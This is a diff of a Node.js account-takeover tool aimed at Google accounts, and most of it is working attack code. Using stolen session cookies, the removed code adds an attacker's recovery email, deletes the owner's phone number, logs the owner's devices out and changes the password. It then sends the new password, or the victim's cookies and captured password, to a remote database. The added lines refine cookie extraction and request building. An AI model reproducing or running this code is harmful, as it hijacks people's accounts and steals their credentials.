-                                            body: getRecoveryData(recovery+'@gmail.com', time),
-                                            headers: {
-                                                'Cookie': sendCookies,
-                                                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                                            },
-                                            followRedirect: false
-                                        }, function(error, response, body) {
-                                            let wrong = true
-                                            try {
-                                                if(!(error || body.includes('"er"'))) {
-                                                    wrong = false
-                                                    request({
-                                                        url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mRAPT,
-                                                        method: 'POST',
-                                                        body: getVerificationData(time),
-                                                        headers: {
-                                                            'Cookie': sendCookies,
-                                                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                                                        },
-                                                        followRedirect: false
-                                                    }, function(error, response, body) {
-                                                        let wrong = true
-                                                        try {
-                                                            if(!(error || body.includes('"er"'))) {
-                                                                wrong = false
-                                                                console.log('Delete Phone Number')
-                                                                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mRAPT, getPhoneData('+'+mData[1].split('/')[1]+mData[2], time), {
-                                                                    headers: {
-                                                                        'Cookie': sendCookies,
-                                                                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                                                                    }
-                                                                }).then(res => {
-                                                                    console.log(res.data)
-                                                                    let wrong = true
-                                                                    try {
-                                                                        if(!res.data.includes('"er"')) {
-                                                                            wrong = false
-                                                                            request({
-                                                                                url: 'https://myaccount.google.com/device-activity',
-                                                                                method: 'GET',
-                                                                                headers: {
-                                                                                    'Cookie': sendCookies,
-                                                                                    'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                                                                                },
-                                                                                followRedirect: false
-                                                                            }, function(error, response, body) {
-                                                                                let wrong = true
-                                                                                try {
-                                                                                    if(!(error || body == '')) {
-                                                                                        let index = body.indexOf('SNlM0e')
-                                                                                        if(index != -1) {
-                                                                                            let temp = body.substring(index+6, index+100)
-                                                                                            time = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
-                                                                                        }
-                                                                
-                                                                                        index = body.indexOf('AF_initDataCallback(')
-                                                                
-                                                                                        if(index != -1) {
-                                                                                            let temp = body.substring(index+20, body.length)
-                                                                                            let data = JSON.parse(temp.substring(temp.indexOf('['), temp.indexOf(', sideChannel: {}});</script>')))[1]
-                                                                                            let logout = {}
-                                                                                            
-                                                                                            for(let i=0; i<data.length; i++) {
-                                                                                                let child = data[i][2]
-                                                                                                for(let j=0; j<child.length; j++) {
-                                                                                                    let main = child[j]
-                                                                                                    if(main.length > 23) {
-                                                                                                        if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
-                                                                                                            logout[main[0]] = main[13]
-                                                                                                        }
-                                                                                                    }
-                                                                                                }
-                                                                                            }
-                    
-                                                                                            if(Object.keys(logout).length > 0) {
-                                                                                                wrong = false
-                    
-                                                                                                let size = 0
-                                                                                                let output = 0
-                    
-                                                                                                for(let [key, value] of Object.entries(logout)) {
-                                                                                                    size++
-                                                                                                    request({
-                                                                                                        url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=YZ6Dc&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key,
-                                                                                                        method: 'POST',
-                                                                                                        body: getLogOut(value, time),
-                                                                                                        headers: {
-                                                                                                            'Cookie': sendCookies,
-                                                                                                            'Content-Type' :'application/x-www-form-urlencoded;charset=UTF-8',
-                                                                                                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                                                                                                        },
-                                                                                                        followRedirect: false
-                                                                                                    }, function(error, response, body) {
-                                                                                                        output++
-                                                                                                        if(output == size) {
-                                                                                                            let changePass = getRandomPassword()
-                                                                                                            request({
-                                                                                                                url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mRAPT,
-                                                                                                                method: 'POST',
-                                                                                                                body: getChangePasswordData(changePass, time),
-                                                                                                                headers: {
-                                                                                                                    'Cookie': sendCookies,
-                                                                                                                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                                                                                                                },
-                                                                                                                followRedirect: false
-                                                                                                            }, function(error, response, body) {
-                                                                                                                let wrong = true
-                                                                                                                try {
-                                                                                                                    if(!(error || body.includes('"er"'))) {
-                                                                                                                        wrong = false
-                                                                                                                        console.log(changePass)
-                                                                                                                        console.log('Completed Process')
-                                                                                                                        let send = { create:year, number:mData[2], password:changePass, recovery:recovery }
-                                                                                                                        console.log(send)
-                                                                                                                        database.child('/code/gmail/completed/'+mData[1].split('/')[0]+'/'+mGmail).update(send)
-                                                                                                                        connection.end(mData[0]+' 12')
-                                                                                                                    }
-                                                                                                                } catch (e) {}
-                                                                                                                
-                                                                                                                try {
-                                                                                                                    if(wrong && connection != null) {
-                                                                                                                        let send = sendCookies
-                                                                                                                        if(send == null) {
-                                                                                                                            send = {}
-                                                                                                                        }
-                                                                                                                        send['PASS'] = password
-                                                                                                                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                                                                                        connection.end(mData[0]+' 11')
-                                                                                                                    }
-                                                                                                                } catch (e) {}
-                                                                                                            })
-                                                                                                        }
-                                                                                                    })
-                                                                                                }
-                                                                                            }
-                                                                                        }
-                                                                                    }
-                                                                                } catch (e) {}
-                    
-                                                                                try {
-                                                                                    if(wrong && connection != null) {
-                                                                                        let changePass = getRandomPassword()
-                                                                                        request({
-                                                                                            url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mRAPT,
-                                                                                            method: 'POST',
-                                                                                            body: getChangePasswordData(changePass, time),
-                                                                                            headers: {
-                                                                                                'Cookie': sendCookies,
-                                                                                                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                                                                                            },
-                                                                                            followRedirect: false
-                                                                                        }, function(error, response, body) {
-                                                                                            let wrong = true
-                                                                                            try {
-                                                                                                if(!(error || body.includes('"er"'))) {
-                                                                                                    wrong = false
-                                                                                                    console.log(changePass)
-                                                                                                    console.log('Completed Process')
-                                                                                                    let send = { create:year, number:mData[2], password:changePass, recovery:recovery }
-                                                                                                    console.log(send)
-                                                                                                    database.child('/code/gmail/completed/'+mData[1].split('/')[0]+'/'+mGmail).update(send)
-                                                                                                    connection.end(mData[0]+' 12')
-                                                                                                }
-                                                                                            } catch (e) {}
-                                                                                            
-                                                                                            try {
-                                                                                                if(wrong && connection != null) {
-                                                                                                    let send = sendCookies
-                                                                                                    if(send == null) {
-                                                                                                        send = {}
-                                                                                                    }
-                                                                                                    send['PASS'] = password
-                                                                                                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                                                                    connection.end(mData[0]+' 11')
-                                                                                                }
-                                                                                            } catch (e) {}
-                                                                                        })
-                                                                                    }
-                                                                                } catch (e) {}
-                                                                            })
-                                                                        } else {
-                                                                            console.log(body)
-                                                                            try {
-                                                                                if(wrong && connection != null) {
-                                                                                    let send = sendCookies
-                                                                                    if(send == null) {
-                                                                                        send = {}
-                                                                                    }
-                                                                                    send['PASS'] = password
-                                                                                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                                                    connection.end(mData[0]+' 99')
-                                                                                }
-                                                                            } catch (e) {}
-                                                                        }
-                                                                    } catch (e) {}
-                                                                }).catch(err => {
-                                                                    console.log(err)
-                                                                    try {
-                                                                        if(wrong && connection != null) {
-                                                                            let send = sendCookies
-                                                                            if(send == null) {
-                                                                                send = {}
-                                                                            }
-                                                                            send['PASS'] = password
-                                                                            database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                                            connection.end(mData[0]+' 9')
-                                                                        }
-                                                                    } catch (e) {}
-                                                                })
-                                                            } else {
-                                                                console.log(body)
-                                                            }
-                                                        } catch (e) {}
-                    
-                                                        try {
-                                                            if(wrong && connection != null) {
-                                                                let send = sendCookies
-                                                                if(send == null) {
-                                                                    send = {}
-                                                                }
-                                                                send['PASS'] = password
-                                                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                                connection.end(mData[0]+' 8')
-                                                            }
-                                                        } catch (e) {}
-                                                    })
-                                                }
-                                            } catch (e) {}
-                    
-                                            try {
-                                                if(wrong && connection != null) {
-                                                    let send = sendCookies
-                                                    if(send == null) {
-                                                        send = {}
-                                                    }
-                                                    send['PASS'] = password
-                                                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                                    connection.end(mData[0]+' 7')
-                                                }
-                                            } catch (e) {}
-                                        })
-                                    }
-                                }
-                            } catch (e) {}
-                            
-                            try {
-                                if(wrong && connection != null) {
-                                    let send = sendCookies
-                                    if(send == null) {
-                                        send = {}
-                                    }
-                                    send['PASS'] = password
-                                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                    connection.end(mData[0]+' 6')
-                                }
-                            } catch (e) {}
-                        })
-                    })
-                }
+            let start = singelData.indexOf('=')
+            let end = singelData.indexOf(';')
+            let key = singelData.substring(0, start)
+            if(key == '__Host-GAPS') {
+                return singelData.substring(start+1, end)
             }
         } catch (e) {}
+    }
 
-        try {
-            if(wrong && connection != null) {
-                let send = sendCookies
-                if(send == null) {
-                    send = {}
-                }
-                send['PASS'] = password
-                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                connection.end(mData[0]+' 33')
-            }
-        } catch (e) {}
-    })
+    let gps = '__Host-GAPS='
+    let index = cookiesList.indexOf(gps)
+    if (index >= 0) {
+        let temp = cookiesList.substring(index, cookiesList.length)
+        return temp.substring(gps.length, temp.indexOf(';'))
+    }
+
+    return tempGps
 }
 
 function getPasswordData(password, type) {
-    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",'Hi, Google Team. My name is Raiyan. It is my mail adress raiyanhossain088@gmail.com. My gmail adress now Disabled. Please Fixed it. its my inportent Gmail Account']))
+    return 'service=accountsettings&continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))
 }
 
 function getRecoveryData(gmail, time) {
@@ -767,9 +627,8 @@ function getVerificationData(time) {
     return 'f.req=%5B%5B%5B%22GWdvgc%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(time)
 }
 
-function getPhoneData(number, time) {
-    console.log(number, time)
-    return 'f.req='+encodeURIComponent(JSON.stringify([[["ZBoWob","[[3,\""+number+"\",null,null,[1,27],null,null,null,null,null,[],1]]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
+function getPhoneData(data, time) {
+    return 'f.req='+encodeURIComponent(JSON.stringify([[[data['type'],"[[3,\""+data['number']+"\",null,null,"+data['token']+",null,null,null,null,null,[],1]]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
 }
 
 function getChangePasswordData(password, time) {
@@ -784,16 +643,14 @@ function getLanguage(time) {
     return 'f.req=%5b%5b%22en%22%5d%5d&at='+encodeURIComponent(time)
 }
 
-function checkYear(data) {
-    var years = ['2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023']
-    for(let i=years.length-1; i>=0; i--) {
-        if(data.includes(years[i])) {
-            return parseInt(years[i])
-        }
+function getIdentifier() {
+    let data = ''
+    let loop = Math.floor(Math.random() * 15)+15
+    for(let i=0; i<loop; i++) {
+        data = data+crypto.randomBytes(20).toString('hex')
     }
-    return parseInt(new Date().getFullYear())
+    return data
 }
-
 
 function getRandomPassword() {
     let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
